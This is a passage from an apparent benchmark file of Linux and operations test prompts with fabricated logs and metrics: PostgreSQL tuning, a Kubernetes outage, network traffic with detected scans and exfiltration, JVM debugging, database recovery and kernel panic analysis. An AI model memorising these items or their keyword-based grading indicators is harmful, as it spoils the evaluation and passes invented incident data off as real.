 | 99   | 67      | 99%        | 85%      | 3200     | 50\n... [60 minutes of metrics]\n\nAnalyze to:\n1. Identify queries with problematic execution patterns\n2. Find missing indexes based on query patterns\n3. Detect table bloat requiring maintenance\n4. Analyze lock contention and deadlock risks\n5. Find queries that should be rewritten for performance\n6. Identify statistics drift causing bad query plans\n7. Detect resource exhaustion correlation with queries\n8. Find N+1 query patterns and ORM inefficiencies\n9. Generate index creation and query optimization recommendations\n10. Prioritize maintenance tasks (VACUUM, ANALYZE, REINDEX)\n",
      "messages": [
        {
          "role": "user",
          "content": "\nAnalyze this PostgreSQL slow query log and system state during a performance crisis:\n\n[Slow Query Log - 5000 queries]\n2024-01-15 10:00:00 UTC [28456]: [1-1] user=app_user,db=production LOG: duration: 45234.123 ms\n  statement: SELECT u.*, o.*, p.* FROM users u \n  LEFT JOIN orders o ON u.id = o.user_id \n  LEFT JOIN products p ON o.product_id = p.id \n  WHERE u.created_at > '2023-01-01' \n  AND NOT EXISTS (\n    SELECT 1 FROM user_sessions us WHERE us.user_id = u.id\n  )\n  ORDER BY u.id, o.created_at DESC;\n\n2024-01-15 10:00:45 UTC [28457]: [1-1] user=app_user,db=production LOG: duration: 67890.456 ms\n  statement: WITH RECURSIVE category_tree AS (\n    SELECT id, parent_id, name, 0 as level \n    FROM categories WHERE parent_id IS NULL\n    UNION ALL\n    SELECT c.id, c.parent_id, c.name, ct.level + 1\n    FROM categories c \n    INNER JOIN category_tree ct ON c.parent_id = ct.id\n  )\n  SELECT * FROM category_tree ORDER BY level, name;\n... [4998 more queries]\n\n[pg_stat_statements - Top 100 queries by total time]\nquery                                    | calls  | total_time   | mean_time | stddev_time\n-----------------------------------------+--------+--------------+-----------+-------------\nSELECT * FROM large_table WHERE $1       | 584921 | 8493829.23  | 14.52     | 234.5\nUPDATE users SET last_seen = $1 WHERE $2 | 923847 | 7234234.45  | 7.83      | 12.3\n... [98 more entries]\n\n[Table Statistics - 500 tables]\nschemaname | tablename       | n_live_tup | n_dead_tup | last_vacuum         | last_analyze\n-----------+-----------------+------------+------------+---------------------+------------------\npublic     | users           | 45839204   | 23492834   | 2024-01-01 00:00:00 | 2023-12-01 00:00:00\npublic     | orders          | 928374923  | 82934782   | NULL                | 2023-06-01 00:00:00\n... [498 more tables]\n\n[Index Usage Statistics - 1000 indexes]\nschemaname | tablename | indexname              | idx_scan | idx_tup_read | idx_tup_fetch | idx_blks_hit\n-----------+-----------+------------------------+----------+--------------+---------------+--------------\npublic     | users     | users_pkey            | 9283847  | 9283847      | 9283847       | 2834782\npublic     | users     | idx_users_created_at  | 0        | 0            | 0             | 0\n... [998 more indexes]\n\n[Lock Analysis - Current locks]\npid   | relation     | mode                | granted | wait_start\n------+--------------+---------------------+---------+------------------------\n28456 | users        | AccessShareLock     | t       | \n28457 | users        | AccessExclusiveLock | f       | 2024-01-15 10:05:00\n... [200 more lock entries]\n\n[System Metrics During Incident]\nTime   | CPU% | IOWait% | MemoryUsed | SwapUsed | ReadMB/s | WriteMB/s\n-------+------+---------+------------+----------+----------+-----------\n10:00  | 95   | 45      | 98%        | 75%      | 2400     | 100\n10:01  | 99   | 67      | 99%        | 85%      | 3200     | 50\n... [60 minutes of metrics]\n\nAnalyze to:\n1. Identify queries with problematic execution patterns\n2. Find missing indexes based on query patterns\n3. Detect table bloat requiring maintenance\n4. Analyze lock contention and deadlock risks\n5. Find queries that should be rewritten for performance\n6. Identify statistics drift causing bad query plans\n7. Detect resource exhaustion correlation with queries\n8. Find N+1 query patterns and ORM inefficiencies\n9. Generate index creation and query optimization recommendations\n10. Prioritize maintenance tasks (VACUUM, ANALYZE, REINDEX)\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "database",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_53",
      "name": "Test 53: Kubernetes Cluster State Analysis",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nAnalyze this Kubernetes cluster state during a major incident:\n\n[Node Status - 50 nodes]\nNAME          STATUS     ROLES    AGE   VERSION   CONDITIONS\nk8s-node-01   Ready      worker   90d   v1.27.3   MemoryPressure=True,DiskPressure=False,PIDPressure=False\nk8s-node-02   NotReady   worker   90d   v1.27.3   MemoryPressure=True,DiskPressure=True,PIDPressure=True\nk8s-node-03   Ready      master   90d   v1.27.3   MemoryPressure=False,DiskPressure=False,PIDPressure=False\n... [47 more nodes]\n\n[Pod Status - 2000 pods across all namespaces]\nNAMESPACE   NAME                           READY   STATUS             RESTARTS   AGE\nproduction  api-deployment-7d4b8c-x9z2    0/1     CrashLoopBackOff   342        5d\nproduction  api-deployment-7d4b8c-k3n4    0/1     OOMKilled          89         5d\nproduction  web-frontend-9g8h7-m2n3       1/1     Running            0          1h\nproduction  web-frontend-9g8h7-p4q5       0/1     ImagePullBackOff   0          3h\n... [1996 more pods]\n\n[Events - Last 1000 events]\nLAST SEEN   TYPE      REASON              OBJECT                           MESSAGE\n2m          Warning   FailedScheduling    pod/api-deployment-7d4b8c-a1b2  0/50 nodes are available: insufficient memory\n5m          Warning   OOMKilling          pod/api-deployment-7d4b8c-k3n4  Memory cgroup out of memory: Killed process 28456\n10m         Warning   NodeNotReady        node/k8s-node-02                Node k8s-node-02 status is now: NodeNotReady\n15m         Warning   FailedMount         pod/web-frontend-9g8h7-p4q5     Unable to attach volume: timeout\n... [996 more events]\n\n[ResourceQuota Status - All namespaces]\nNAMESPACE   NAME              USED                      HARD\nproduction  compute-quota     requests.cpu: 450/500    requests.cpu: 500\nproduction  compute-quota     requests.memory: 950Gi/1Ti requests.memory: 1Ti\nstaging     compute-quota     requests.cpu: 50/100     requests.cpu: 100\n... [20 more quotas]\n\n[PVC Status - 500 persistent volume claims]\nNAMESPACE   NAME          STATUS   VOLUME              CAPACITY   STORAGECLASS\nproduction  data-vol-0    Bound    pvc-7d4b8c9e       100Gi      fast-ssd\nproduction  data-vol-1    Pending                                 fast-ssd\nproduction  logs-vol-0    Lost     pvc-9f8e7d6c       50Gi       standard\n... [497 more PVCs]\n\n[Network Policies - 100 policies]\nNAMESPACE   NAME              POD-SELECTOR         INGRESS-RULES   EGRESS-RULES\nproduction  deny-all          <all>                0               0\nproduction  allow-frontend    app=frontend         2               1\nproduction  allow-backend     app=backend          1               3\n... [97 more policies]\n\n[HPA Status - 50 autoscalers]\nNAMESPACE   NAME          REFERENCE                    TARGETS           MINPODS   MAXPODS   REPLICAS\nproduction  api-hpa       Deployment/api-deployment    CPU: 95%/70%     5         50        50\nproduction  web-hpa       Deployment/web-frontend      CPU: 45%/70%     3         30        15\n... [48 more HPAs]\n\n[Service Endpoints - 200 services]\nNAMESPACE   NAME          ENDPOINTS                                            AGE\nproduction  api-service   <none>                                               5d\nproduction  web-service   10.244.1.5:8080,10.244.2.6:8080,10.244.3.7:8080   5d\n... [198 more services]\n\nAnalyze to:\n1. Identify cascading failure patterns across the cluster\n2. Find resource bottlenecks causing scheduling failures  \n3. Analyze pod failure reasons and remediation strategies\n4. Detect misconfigured resource requests/limits\n5. Identify storage issues affecting application availability\n6. Find network policy conflicts causing connectivity issues\n7. Analyze HPA behavior and scaling bottlenecks\n8. Detect node-level issues affecting cluster stability\n9. Identify namespace quota exhaustion patterns\n10. Generate cluster recovery and optimization plan\n",
      "messages": [
        {
          "role": "user",
          "content": "\nAnalyze this Kubernetes cluster state during a major incident:\n\n[Node Status - 50 nodes]\nNAME          STATUS     ROLES    AGE   VERSION   CONDITIONS\nk8s-node-01   Ready      worker   90d   v1.27.3   MemoryPressure=True,DiskPressure=False,PIDPressure=False\nk8s-node-02   NotReady   worker   90d   v1.27.3   MemoryPressure=True,DiskPressure=True,PIDPressure=True\nk8s-node-03   Ready      master   90d   v1.27.3   MemoryPressure=False,DiskPressure=False,PIDPressure=False\n... [47 more nodes]\n\n[Pod Status - 2000 pods across all namespaces]\nNAMESPACE   NAME                           READY   STATUS             RESTARTS   AGE\nproduction  api-deployment-7d4b8c-x9z2    0/1     CrashLoopBackOff   342        5d\nproduction  api-deployment-7d4b8c-k3n4    0/1     OOMKilled          89         5d\nproduction  web-frontend-9g8h7-m2n3       1/1     Running            0          1h\nproduction  web-frontend-9g8h7-p4q5       0/1     ImagePullBackOff   0          3h\n... [1996 more pods]\n\n[Events - Last 1000 events]\nLAST SEEN   TYPE      REASON              OBJECT                           MESSAGE\n2m          Warning   FailedScheduling    pod/api-deployment-7d4b8c-a1b2  0/50 nodes are available: insufficient memory\n5m          Warning   OOMKilling          pod/api-deployment-7d4b8c-k3n4  Memory cgroup out of memory: Killed process 28456\n10m         Warning   NodeNotReady        node/k8s-node-02                Node k8s-node-02 status is now: NodeNotReady\n15m         Warning   FailedMount         pod/web-frontend-9g8h7-p4q5     Unable to attach volume: timeout\n... [996 more events]\n\n[ResourceQuota Status - All namespaces]\nNAMESPACE   NAME              USED                      HARD\nproduction  compute-quota     requests.cpu: 450/500    requests.cpu: 500\nproduction  compute-quota     requests.memory: 950Gi/1Ti requests.memory: 1Ti\nstaging     compute-quota     requests.cpu: 50/100     requests.cpu: 100\n... [20 more quotas]\n\n[PVC Status - 500 persistent volume claims]\nNAMESPACE   NAME          STATUS   VOLUME              CAPACITY   STORAGECLASS\nproduction  data-vol-0    Bound    pvc-7d4b8c9e       100Gi      fast-ssd\nproduction  data-vol-1    Pending                                 fast-ssd\nproduction  logs-vol-0    Lost     pvc-9f8e7d6c       50Gi       standard\n... [497 more PVCs]\n\n[Network Policies - 100 policies]\nNAMESPACE   NAME              POD-SELECTOR         INGRESS-RULES   EGRESS-RULES\nproduction  deny-all          <all>                0               0\nproduction  allow-frontend    app=frontend         2               1\nproduction  allow-backend     app=backend          1               3\n... [97 more policies]\n\n[HPA Status - 50 autoscalers]\nNAMESPACE   NAME          REFERENCE                    TARGETS           MINPODS   MAXPODS   REPLICAS\nproduction  api-hpa       Deployment/api-deployment    CPU: 95%/70%     5         50        50\nproduction  web-hpa       Deployment/web-frontend      CPU: 45%/70%     3         30        15\n... [48 more HPAs]\n\n[Service Endpoints - 200 services]\nNAMESPACE   NAME          ENDPOINTS                                            AGE\nproduction  api-service   <none>                                               5d\nproduction  web-service   10.244.1.5:8080,10.244.2.6:8080,10.244.3.7:8080   5d\n... [198 more services]\n\nAnalyze to:\n1. Identify cascading failure patterns across the cluster\n2. Find resource bottlenecks causing scheduling failures  \n3. Analyze pod failure reasons and remediation strategies\n4. Detect misconfigured resource requests/limits\n5. Identify storage issues affecting application availability\n6. Find network policy conflicts causing connectivity issues\n7. Analyze HPA behavior and scaling bottlenecks\n8. Detect node-level issues affecting cluster stability\n9. Identify namespace quota exhaustion patterns\n10. Generate cluster recovery and optimization plan\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_54",
      "name": "Test 54: Comprehensive Network Traffic Analysis",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_networking",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux networking",
      "prompt": "\nAnalyze this detailed network capture and flow data for security and performance issues:\n\n[tcpdump Summary - 10000 packets]\n10:00:00.123456 IP 10.0.0.5.39284 > 185.234.218.15.443: Flags [S], seq 1234567890\n10:00:00.123457 IP 185.234.218.15.443 > 10.0.0.5.39284: Flags [S.], seq 987654321, ack 1234567891\n10:00:00.123458 IP 10.0.0.5.39284 > 185.234.218.15.443: Flags [.], ack 1\n10:00:00.123459 IP 10.0.0.5.39284 > 185.234.218.15.443: Flags [P.], seq 1:1461, ack 1, length 1460\n... [9996 more packets]\n\n[Flow Statistics - 5000 flows]\nProto | Src IP:Port        | Dst IP:Port         | Packets | Bytes    | Duration | Flags\nTCP   | 10.0.0.5:39284    | 185.234.218.15:443 | 45823   | 52428800 | 3600s    | ESTABLISHED\nTCP   | 10.0.0.5:39285    | 192.168.1.100:22   | 234     | 23456    | 5s       | RST\nUDP   | 10.0.0.5:53       | 8.8.8.8:53         | 10000   | 500000   | 3600s    | \n... [4997 more flows]\n\n[DPI (Deep Packet Inspection) Results - 2000 identified protocols]\nHTTP/1.1:  2341 flows, 234MB transferred\nHTTPS:     5832 flows, 5.2GB transferred  \nSSH:       234 flows, 123MB transferred\nDNS:       10234 flows, 50MB transferred\nBitTorrent: 23 flows, 2.3GB transferred\nUnknown:   834 flows, 923MB transferred\n... [1994 more protocol identifications]\n\n[Anomaly Detection Results - 500 anomalies]\nType: Port Scan\n  Source: 185.234.218.15\n  Target: 10.0.0.0/24\n  Ports: 1-65535\n  Time: 10:15:00-10:16:00\n\nType: DDoS Pattern\n  Target: 10.0.0.5:80\n  Sources: 5000+ unique IPs\n  Pattern: SYN flood\n  Rate: 50000 pps\n\nType: Data Exfiltration\n  Source: 10.0.0.5\n  Destination: 185.234.218.15\n  Volume: 5GB in 5 minutes\n  Pattern: Steady stream, encrypted\n... [496 more anomalies]\n\n[Connection State Analysis]\nState         | Count  | Percentage\nESTABLISHED   | 23456  | 45%\nTIME_WAIT     | 15234  | 29%\nSYN_SENT      | 8234   | 16%\nCLOSE_WAIT    | 3456   | 7%\nFIN_WAIT1     | 1234   | 2%\nSYN_RECV      | 456    | 1%\n\n[Bandwidth Usage by Application]\nApplication | Inbound  | Outbound | Total    | Peak Rate\nWeb         | 2.3GB    | 15.6GB   | 17.9GB   | 1.2Gbps\nDatabase    | 5.4GB    | 1.2GB    | 6.6GB    | 800Mbps\nBackup      | 123MB    | 45.6GB   | 45.7GB   | 5Gbps\n... [20 more applications]\n\n[Geographic Traffic Analysis]\nCountry     | Inbound Connections | Outbound Connections | Suspicious Score\nUS          | 12345              | 23456                | Low\nCN          | 5432               | 123                  | High\nRU          | 3456               | 456                  | High\n... [50 more countries]\n\nAnalyze to:\n1. Identify ongoing attacks (DDoS, port scans, exploitation attempts)\n2. Detect data exfiltration patterns and volume\n3. Find performance bottlenecks from connection states\n4. Identify suspicious geographic patterns\n5. Detect protocol anomalies and misuse\n6. Analyze bandwidth consumption patterns\n7. Find indicators of compromised systems\n8. Identify poorly configured applications (connection leaks, etc.)\n9. Detect encrypted malicious traffic patterns\n10. Generate network security and optimization recommendations\n",
      "messages": [
        {
          "role": "user",
          "content": "\nAnalyze this detailed network capture and flow data for security and performance issues:\n\n[tcpdump Summary - 10000 packets]\n10:00:00.123456 IP 10.0.0.5.39284 > 185.234.218.15.443: Flags [S], seq 1234567890\n10:00:00.123457 IP 185.234.218.15.443 > 10.0.0.5.39284: Flags [S.], seq 987654321, ack 1234567891\n10:00:00.123458 IP 10.0.0.5.39284 > 185.234.218.15.443: Flags [.], ack 1\n10:00:00.123459 IP 10.0.0.5.39284 > 185.234.218.15.443: Flags [P.], seq 1:1461, ack 1, length 1460\n... [9996 more packets]\n\n[Flow Statistics - 5000 flows]\nProto | Src IP:Port        | Dst IP:Port         | Packets | Bytes    | Duration | Flags\nTCP   | 10.0.0.5:39284    | 185.234.218.15:443 | 45823   | 52428800 | 3600s    | ESTABLISHED\nTCP   | 10.0.0.5:39285    | 192.168.1.100:22   | 234     | 23456    | 5s       | RST\nUDP   | 10.0.0.5:53       | 8.8.8.8:53         | 10000   | 500000   | 3600s    | \n... [4997 more flows]\n\n[DPI (Deep Packet Inspection) Results - 2000 identified protocols]\nHTTP/1.1:  2341 flows, 234MB transferred\nHTTPS:     5832 flows, 5.2GB transferred  \nSSH:       234 flows, 123MB transferred\nDNS:       10234 flows, 50MB transferred\nBitTorrent: 23 flows, 2.3GB transferred\nUnknown:   834 flows, 923MB transferred\n... [1994 more protocol identifications]\n\n[Anomaly Detection Results - 500 anomalies]\nType: Port Scan\n  Source: 185.234.218.15\n  Target: 10.0.0.0/24\n  Ports: 1-65535\n  Time: 10:15:00-10:16:00\n\nType: DDoS Pattern\n  Target: 10.0.0.5:80\n  Sources: 5000+ unique IPs\n  Pattern: SYN flood\n  Rate: 50000 pps\n\nType: Data Exfiltration\n  Source: 10.0.0.5\n  Destination: 185.234.218.15\n  Volume: 5GB in 5 minutes\n  Pattern: Steady stream, encrypted\n... [496 more anomalies]\n\n[Connection State Analysis]\nState         | Count  | Percentage\nESTABLISHED   | 23456  | 45%\nTIME_WAIT     | 15234  | 29%\nSYN_SENT      | 8234   | 16%\nCLOSE_WAIT    | 3456   | 7%\nFIN_WAIT1     | 1234   | 2%\nSYN_RECV      | 456    | 1%\n\n[Bandwidth Usage by Application]\nApplication | Inbound  | Outbound | Total    | Peak Rate\nWeb         | 2.3GB    | 15.6GB   | 17.9GB   | 1.2Gbps\nDatabase    | 5.4GB    | 1.2GB    | 6.6GB    | 800Mbps\nBackup      | 123MB    | 45.6GB   | 45.7GB   | 5Gbps\n... [20 more applications]\n\n[Geographic Traffic Analysis]\nCountry     | Inbound Connections | Outbound Connections | Suspicious Score\nUS          | 12345              | 23456                | Low\nCN          | 5432               | 123                  | High\nRU          | 3456               | 456                  | High\n... [50 more countries]\n\nAnalyze to:\n1. Identify ongoing attacks (DDoS, port scans, exploitation attempts)\n2. Detect data exfiltration patterns and volume\n3. Find performance bottlenecks from connection states\n4. Identify suspicious geographic patterns\n5. Detect protocol anomalies and misuse\n6. Analyze bandwidth consumption patterns\n7. Find indicators of compromised systems\n8. Identify poorly configured applications (connection leaks, etc.)\n9. Detect encrypted malicious traffic patterns\n10. Generate network security and optimization recommendations\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "security",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_55",
      "name": "Test 55: Multi-Layer Application Debugging",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "multi_hop",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nAnalyze this multi-layer application debugging data to identify the root cause of intermittent failures:\n\n[Application Logs - 3000 lines with stack traces]\n2024-01-15 10:00:00.123 ERROR [RequestID: abc-123] NullPointerException in UserService.java:156\n    at com.app.service.UserService.processUser(UserService.java:156)\n    at com.app.controller.UserController.updateUser(UserController.java:89)\n    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)\n    ... 45 more lines of stack trace\n2024-01-15 10:00:00.456 WARN [RequestID: abc-123] Database connection pool exhausted, waiting...\n2024-01-15 10:00:05.456 ERROR [RequestID: abc-123] Timeout waiting for database connection\n... [2997 more log lines]\n\n[JVM Heap Dump Analysis Summary]\nTotal Heap: 8GB\nUsed Heap: 7.8GB\nObject Count: 45,234,567\nLargest Objects:\n  - HashMap (2.3GB) containing 5 million User objects\n  - ArrayList (1.8GB) containing cached query results\n  - byte[][] (1.2GB) appearing to be leaked image data\nLeak Suspects:\n  - com.app.cache.UserCache: Growing unbounded\n  - com.app.image.ImageProcessor: Not releasing processed images\n... [500 more lines of heap analysis]\n\n[Thread Dump - 200 threads]\n\"http-nio-8080-exec-1\" #28 daemon prio=5 os_prio=0 tid=0x00007f4a2c001000 nid=0x7f waiting for monitor entry\n   java.lang.Thread.State: BLOCKED (on object monitor)\n        at com.app.service.UserService.synchronized(UserService.java:234)\n        - waiting to lock <0x000000076ab62208> (a java.lang.Object)\n        - locked <0x000000076ab62208> (a java.lang.Object)\n        at com.app.controller.UserController.getUser(UserController.java:45)\n... [199 more thread states]\n\n[Database Profiling Data]\nQuery: SELECT * FROM users WHERE id = ?\n  Execution Count: 584,291\n  Avg Time: 1.2ms\n  Max Time: 45,234ms (during incident)\n  \nQuery: UPDATE user_sessions SET last_seen = NOW() WHERE user_id = ?\n  Execution Count: 892,734  \n  Avg Time: 0.5ms\n  Max Time: 30,123ms (during incident)\n  Lock Waits: 23,456\n... [100 more query profiles]\n\n[GC Logs Analysis]\n[GC (Allocation Failure) 7234.123: [ParNew: 1048576K->104857K(1048576K), 0.234567 secs]\n[Full GC (Ergonomics) 7456.789: [CMS: 6291456K->5242880K(7340032K), 12.345678 secs]\n[GC (CMS Final Remark) 7589.234: [Rescan (parallel), 2.345678 secs]\nGC Summary:\n  - Young GC: 5823 times, Total pause: 234.5s\n  - Full GC: 89 times, Total pause: 1098.7s\n  - Longest pause: 23.4s\n... [1000 more GC events]\n\n[System Metrics Correlation]\nTime     | CPU% | Memory% | GC% | DB Conn | Response Time | Error Rate\n10:00:00 | 45   | 60      | 5   | 50/100  | 50ms         | 0.1%\n10:00:30 | 67   | 75      | 15  | 75/100  | 200ms        | 0.5%\n10:01:00 | 89   | 85      | 35  | 95/100  | 2000ms       | 5%\n10:01:30 | 99   | 95      | 78  | 100/100 | 30000ms      | 45%\n... [120 more time points]\n\n[Network Trace Between App and DB]\n10:00:00.123 APP->DB: SELECT * FROM users WHERE id = 12345\n10:00:00.125 DB->APP: (1 row returned in 2ms)\n10:00:00.456 APP->DB: BEGIN TRANSACTION\n10:00:00.457 APP->DB: UPDATE users SET last_login = NOW() WHERE id = 12345\n10:00:30.457 APP->DB: [Connection timeout after 30s]\n10:00:30.458 APP: Opens new connection\n10:00:30.459 APP->DB: SELECT 1 (connection test)\n10:01:00.459 DB->APP: ERROR: connection limit reached\n... [5000 more network events]\n\nAnalyze to:\n1. Identify the root cause of the cascading failure\n2. Find memory leaks and their sources\n3. Detect deadlocks and lock contention issues\n4. Analyze GC impact on application performance\n5. Identify database connection pool problems\n6. Find inefficient queries causing slowdowns\n7. Detect thread pool exhaustion patterns\n8. Correlate system metrics with application behavior\n9. Identify configuration issues (pool sizes, timeouts, etc.)\n10. Generate specific code fixes and configuration changes\n",
      "messages": [
        {
          "role": "user",
          "content": "\nAnalyze this multi-layer application debugging data to identify the root cause of intermittent failures:\n\n[Application Logs - 3000 lines with stack traces]\n2024-01-15 10:00:00.123 ERROR [RequestID: abc-123] NullPointerException in UserService.java:156\n    at com.app.service.UserService.processUser(UserService.java:156)\n    at com.app.controller.UserController.updateUser(UserController.java:89)\n    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)\n    ... 45 more lines of stack trace\n2024-01-15 10:00:00.456 WARN [RequestID: abc-123] Database connection pool exhausted, waiting...\n2024-01-15 10:00:05.456 ERROR [RequestID: abc-123] Timeout waiting for database connection\n... [2997 more log lines]\n\n[JVM Heap Dump Analysis Summary]\nTotal Heap: 8GB\nUsed Heap: 7.8GB\nObject Count: 45,234,567\nLargest Objects:\n  - HashMap (2.3GB) containing 5 million User objects\n  - ArrayList (1.8GB) containing cached query results\n  - byte[][] (1.2GB) appearing to be leaked image data\nLeak Suspects:\n  - com.app.cache.UserCache: Growing unbounded\n  - com.app.image.ImageProcessor: Not releasing processed images\n... [500 more lines of heap analysis]\n\n[Thread Dump - 200 threads]\n\"http-nio-8080-exec-1\" #28 daemon prio=5 os_prio=0 tid=0x00007f4a2c001000 nid=0x7f waiting for monitor entry\n   java.lang.Thread.State: BLOCKED (on object monitor)\n        at com.app.service.UserService.synchronized(UserService.java:234)\n        - waiting to lock <0x000000076ab62208> (a java.lang.Object)\n        - locked <0x000000076ab62208> (a java.lang.Object)\n        at com.app.controller.UserController.getUser(UserController.java:45)\n... [199 more thread states]\n\n[Database Profiling Data]\nQuery: SELECT * FROM users WHERE id = ?\n  Execution Count: 584,291\n  Avg Time: 1.2ms\n  Max Time: 45,234ms (during incident)\n  \nQuery: UPDATE user_sessions SET last_seen = NOW() WHERE user_id = ?\n  Execution Count: 892,734  \n  Avg Time: 0.5ms\n  Max Time: 30,123ms (during incident)\n  Lock Waits: 23,456\n... [100 more query profiles]\n\n[GC Logs Analysis]\n[GC (Allocation Failure) 7234.123: [ParNew: 1048576K->104857K(1048576K), 0.234567 secs]\n[Full GC (Ergonomics) 7456.789: [CMS: 6291456K->5242880K(7340032K), 12.345678 secs]\n[GC (CMS Final Remark) 7589.234: [Rescan (parallel), 2.345678 secs]\nGC Summary:\n  - Young GC: 5823 times, Total pause: 234.5s\n  - Full GC: 89 times, Total pause: 1098.7s\n  - Longest pause: 23.4s\n... [1000 more GC events]\n\n[System Metrics Correlation]\nTime     | CPU% | Memory% | GC% | DB Conn | Response Time | Error Rate\n10:00:00 | 45   | 60      | 5   | 50/100  | 50ms         | 0.1%\n10:00:30 | 67   | 75      | 15  | 75/100  | 200ms        | 0.5%\n10:01:00 | 89   | 85      | 35  | 95/100  | 2000ms       | 5%\n10:01:30 | 99   | 95      | 78  | 100/100 | 30000ms      | 45%\n... [120 more time points]\n\n[Network Trace Between App and DB]\n10:00:00.123 APP->DB: SELECT * FROM users WHERE id = 12345\n10:00:00.125 DB->APP: (1 row returned in 2ms)\n10:00:00.456 APP->DB: BEGIN TRANSACTION\n10:00:00.457 APP->DB: UPDATE users SET last_login = NOW() WHERE id = 12345\n10:00:30.457 APP->DB: [Connection timeout after 30s]\n10:00:30.458 APP: Opens new connection\n10:00:30.459 APP->DB: SELECT 1 (connection test)\n10:01:00.459 DB->APP: ERROR: connection limit reached\n... [5000 more network events]\n\nAnalyze to:\n1. Identify the root cause of the cascading failure\n2. Find memory leaks and their sources\n3. Detect deadlocks and lock contention issues\n4. Analyze GC impact on application performance\n5. Identify database connection pool problems\n6. Find inefficient queries causing slowdowns\n7. Detect thread pool exhaustion patterns\n8. Correlate system metrics with application behavior\n9. Identify configuration issues (pool sizes, timeouts, etc.)\n10. Generate specific code fixes and configuration changes\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "multi_hop",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_56",
      "name": "Test 56: Production Database Corruption Recovery",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_database",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux database",
      "prompt": "\nA production PostgreSQL database has corruption after a power failure. Write a recovery script that:\n1. Checks pg_control for the last checkpoint location using pg_controldata\n2. Analyzes WAL files in pg_wal to find the last consistent state\n3. Uses pg_resetwal carefully with calculated values for transaction ID, OID, and multitransaction ID\n4. Implements a page-level corruption check using pg_checksums\n5. Extracts salvageable data from corrupted tables using pageinspect extension\n6. Rebuilds corrupted indexes after identifying them with bt_index_check()\n7. Validates referential integrity after recovery using foreign key checks\n8. Creates a recovery report documenting data loss and recovery actions\nInclude safety checks to prevent data loss and detailed logging of each step.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nA production PostgreSQL database has corruption after a power failure. Write a recovery script that:\n1. Checks pg_control for the last checkpoint location using pg_controldata\n2. Analyzes WAL files in pg_wal to find the last consistent state\n3. Uses pg_resetwal carefully with calculated values for transaction ID, OID, and multitransaction ID\n4. Implements a page-level corruption check using pg_checksums\n5. Extracts salvageable data from corrupted tables using pageinspect extension\n6. Rebuilds corrupted indexes after identifying them with bt_index_check()\n7. Validates referential integrity after recovery using foreign key checks\n8. Creates a recovery report documenting data loss and recovery actions\nInclude safety checks to prevent data loss and detailed logging of each step.\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "database",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_57",
      "name": "Test 57: Kernel Panic Root Cause Analysis",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nCreate a kernel panic analysis toolkit that:\n1. Parses kdump/crash dumps to extract panic information\n2. Analyzes the call stack to identify the faulting module and function\n3. Decodes kernel symbols and inline functions from vmlinux\n4. Checks for known hardware issues based on MCE (Machine Check Exception) logs\n5. Analyzes kernel taint flags and their implications\n6. Searches for similar panics in kernel bugzilla and LKML\n7. Generates a disassembly of the faulting code section\n8. Checks for race conditions based on CPU and lock states\n9. Analyzes memory corruption patterns if present\n10. Produces a detailed report with debugging recommendations\n",
      "messages": [
        {
          "role": "user",
